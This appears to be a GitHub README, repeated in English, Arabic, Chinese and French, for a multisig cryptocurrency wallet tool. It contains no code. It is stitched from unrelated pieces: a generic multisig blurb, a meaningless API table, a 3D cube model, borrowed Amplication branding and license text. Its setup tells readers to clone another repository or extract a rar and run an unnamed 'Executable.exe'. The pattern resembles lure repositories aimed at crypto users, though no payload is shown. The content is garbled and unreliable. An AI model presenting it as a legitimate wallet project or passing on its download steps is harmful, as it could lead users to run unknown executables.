Topics: multisig-wallet, ethereum-wallet, tron-network, hd-wallet, tron-multisig, ethereum-multisig, multisig-api, bitcoin-multisig, multisig-contract, tron-multisig-api, ethereum-multisig-api, bch-multisig, multisig-transactions, shared-wallet, multi-signature-api, tron-wallet-api, eth-multisig-wallet, multisig-vault, secure-multisig, bitcoin-cash-wallet

<!-- EN -->
## EN

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">Building System Applications with C# & C++ 🚀</i>
</p>

## README LANGUAGE

<p align="center">
    LANGUAGES!
</p>
<p align="center">
    <a href="#EN">ENGLISH</a>
    <a href="#AR">ARABIC</a>
    <a href="#CH">CHINESE</a>
    <a href="#FR">FRENCH</a>
    <a href="#PR">PORTUGuESE</a>
    <a href="#TR">TURKISH</a>
</p>
  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## Read About
MultiSig (multi-signature) transactions require multiple private keys to authorize a cryptocurrency transaction, enhancing security. This setup ensures that no single party can unilaterally move funds, reducing the risk of fraud and unauthorized access. MultiSig is commonly used in corporate accounts, joint accounts, and escrow services, providing an additional layer of protection by requiring multiple approvals for each transaction.


#### **Please ReaD First What You Need Part.**
#### <p align="Left">(<a href="#what-you-need-1">WHAT YOU NEED</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)




```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```
### What You Need
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ROADMAP -->
## Roadmap

- [ ] New Gui
- [x] Add back to top links
- [ ] Add Additional Templates w/ Examples
- [ ] New Features
- [x] Multi-language Support
    - [x] Chinese
    - [x] Turkish
    - [x] French
    - [x] Spanish

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* npm
  ```sh
  npm install npm@latest -g
  ```

### Installation

1. Download Visual Studio 2022
_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Download These

2. Clone the repo
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. OR

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _Then open the sln (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- CONTRIBUTING -->
## Contributing
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


Not sure where to start? Join our discord and we will help you get started!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

<!-- AR -->
## AR

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">بناء تطبيقات النظام باستخدام C# وC++ 🚀</i>
</p>

## اللغة التمهيدية

<p align="center">
    اللغات!
</p>
<p align="center">
    <a href="#EN">إنجليزي</a>
    <a href="#AR">ARABIC</a>
    <a href="#CH">صينى</a>
    <a href="#FR">فرنسي</a>
    <a href="#PR">البرتغالية</a>
    <a href="#TR">اللغة التركية</a>
</p>

  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## أقرأ عن
تتطلب معاملات MultiSig (متعددة التوقيع) مفاتيح خاصة متعددة للسماح بمعاملة العملة المشفرة، مما يعزز الأمان. ويضمن هذا الإعداد عدم تمكن أي طرف منفرد من نقل الأموال من جانب واحد، مما يقلل من مخاطر الاحتيال والوصول غير المصرح به. يُستخدم MultiSig بشكل شائع في حسابات الشركات والحسابات المشتركة وخدمات الضمان، مما يوفر طبقة إضافية من الحماية من خلال طلب موافقات متعددة لكل معاملة.

#### **يرجى قراءة الجزء الأول الذي تحتاجه.**
#### <p align="Left">(<a href="#what-you-need-1">ماذا تحتاج</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)


```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```
### What You Need
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

<!-- ROADMAP -->
## خريطة الطريق

- [ ] جديد Gui
- [x] أضف العودة إلى الروابط العليا
- [ ] أضف قوالب إضافية مع أمثلة
- [ ] جديد سمات
- [x] دعم متعدد اللغات
    - [x] صينى
    - [x] اللغة التركية
    - [x] فرنسي
    - [x] الأسبانية

<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

<!-- GETTING STARTED -->
## ابدء

### المتطلبات الأساسية

هذا مثال لكيفية إدراج الأشياء التي تحتاجها لاستخدام البرنامج وكيفية تثبيتها.
* npm
  ```sh
  npm install npm@latest -g
  ```

### تثبيت

1. تحميل Visual Studio 2022
_باستخدام Git Clone أو إما تنزيل المشروع أو الخروج من ملف rar. ثم قم بتنزيل Visual Studio 2022 هنا الرابط [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> قم بتنزيل هذه


2. استنساخ الريبو
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. أو

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _ثم افتح sln (Project Solution) ملف_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. ابحث عن الملف القابل للتنفيذ
   ```sh
   /ProjectName/Bin/Debug/قابل للتنفيذ (. EXE
   ```
<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

<!-- CONTRIBUTING -->
## المساهمة
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


لست متأكدا من أين تبدأ؟ انضم إلى خلافنا وسنساعدك على البدء!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">العودة إلى الأعلى</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

## License

جزء كبير من هذا المشروع مرخص بموجب [Apache 2.0](./LICENSE) license. الاستثناء الوحيد هو المكونات الموجودة تحت `ee` (enterprise edition) directory, these are licensed under the [Amplication Enterprise Edition](./ee/LICENSE) license.


<!-- CH -->
## CH

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">使用 C# 和 C++ 构建系统应用程序 🚀</i>
</p>

## 自述文件语言

<p align="center">
    语言!
</p>
<p align="center">
    <a href="#EN">英语</a>
    <a href="#AR">阿拉伯</a>
    <a href="#CH">CHINESE</a>
    <a href="#FR">法语</a>
    <a href="#PR">葡萄牙语</a>
    <a href="#TR">土耳其</a>
</p>

  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## 阅读
MultiSig（多重签名）交易需要多个私钥来授权加密货币交易，从而增强安全性。这种设置确保任何一方都不能单方面转移资金，从而降低欺诈和未经授权访问的风险。多重签名通常用于公司账户、联名账户和托管服务，通过要求每笔交易获得多重批准来提供额外的保护层。

#### **请先阅读您需要的部分。**
#### <p align="Left">(<a href="#what-you-need-1">您需要什么</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)



```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```
### What You Need
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

<!-- ROADMAP -->
## 路线图

- [ ] 新的 Gui
- [x] 添加返回顶部链接
- [ ] 添加附加模板和示例
- [ ] 新的 特征
- [x] 多语言支持
    - [x] 中国人
    - [x] 土耳其
    - [x] 法语
    - [x] 西班牙语

<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

<!-- GETTING STARTED -->
## 入门

### 先决条件

这是如何列出使用该软件所需的东西以及如何安装它们的示例。
* npm
  ```sh
  npm install npm@latest -g
  ```

### 安装

1. 下载 Visual Studio 2022
_使用 Git Clone 或者下载项目或退出 rar。然后在此处下载 Visual Studio 2022 链接 [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> 下载这些


2. 克隆存储库
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. OR

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _然后打开sln (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. 查找可执行文件
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

<!-- CONTRIBUTING -->
## 贡献
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


不知道从哪里开始？加入我们的discord，我们将帮助您开始！

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">回到顶部</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>

## 执照

该项目的很大一部分是根据 [Apache 2.0](./LICENSE) 执照。唯一的例外是下面的组件 `ee` (enterprise edition) directory, these are licensed under the [Amplication Enterprise Edition](./ee/LICENSE) license.


<!-- FR -->
## FR

<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">Création d'applications système avec C# et C++ 🚀</i>
</p>

## LANGUE README

<p align="center">
    LANGAGES!
</p>
<p align="center">
    <a href="#EN">ANGLAIS</a>
    <a href="#AR">ARABE</a>
    <a href="#CH">CHINOIS</a>
    <a href="#FR">FRANÇAIS</a>
    <a href="#PR">Portugais</a>
    <a href="#TR">TURC</a>
</p>

  
---------------------------------  
  
<p align="center">
  <img src="https://github.com/lastw312/31/assets/170560413/13832f9e-0e59-4dc4-966e-406e9fad20cc" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
</p>

## Lire à propos
Les transactions MultiSig (multi-signature) nécessitent plusieurs clés privées pour autoriser une transaction de crypto-monnaie, améliorant ainsi la sécurité. Cette configuration garantit qu'aucune partie ne peut déplacer des fonds unilatéralement, réduisant ainsi le risque de fraude et d'accès non autorisé. MultiSig est couramment utilisé dans les comptes d'entreprise, les comptes conjoints et les services de dépôt fiduciaire, offrant une couche de protection supplémentaire en exigeant plusieurs approbations pour chaque transaction.


#### **Veuillez lire d'abord la pièce dont vous avez besoin.**
#### <p align="Left">(<a href="#what-you-need-1">DE QUOI AS-TU BESOIN</a>)</p> 

https://github.com/df123hh/photo/assets/171132664/cb0d4b19-10b2-4c0b-bf9e-062ed641fef4

![ezgif com-animated-gif-maker](https://github.com/df123hh/photo/assets/171132664/69e1f18c-2ced-4c7e-81e7-0035a98f94ce)

```mermaid
erDiagram
    WALLET {
        string id
        string owner
        float balance
    }
    WALLET ||--o{ TRANSACTION : initiates
    WALLET ||--o{ BALANCE : updates
    TRANSACTION ||--o{ CONFIRMATION : confirms
    CONFIRMATION ||--o{ WALLET : updates
    CONFIRMATION ||--o{ BLOCKCHAIN : records
    BLOCKCHAIN }|--o{ TRANSACTION : contains
    BLOCKCHAIN }|--o{ BALANCE : contains
```

### What You Need
----
                    
| Explorer      | Api |
| --------- | -----:|
| Blockchain  | 0000 |
| Etherscan     |   Daf |
| Oklink      |    000 |
| BlockCypher |    ST8 |
| Explorer-Solana |    91 |
                
----
<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

<!-- ROADMAP -->
## Feuille de Route

- [ ] Nouvelle Gui
- [x] Ajouter des liens vers le haut
- [ ] Ajouter Des Modèles Supplémentaires avec des Exemples
- [ ] Nouvelles Fonctionnalités
- [x] Prise en charge multilingue
    - [x] Chinois
    - [x] Turc
    - [x] Français
    - [x] Espagnol

<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

<!-- GETTING STARTED -->
## Pour Commencer

### Prérequis

Ceci est un exemple de la façon de répertorier les éléments dont vous avez besoin pour utiliser le logiciel et de les installer.
* npm
  ```sh
  npm install npm@latest -g
  ```

### Montage

1. Télécharger Visual Studio 2022
_en utilisant Git Clone Ou téléchargez le projet ou quittez le rar. Ensuite, Téléchargez Visual Studio 2022 Ici Lien [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Téléchargez-Les


2. Cloner le dépôt
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. OU

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _Ensuite, ouvrez le sln (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. Trouver un Fichier Exécutable
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">retour au sommet</a>)</p>

<!-- CONTRIBUTING -->
## Contribuant
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
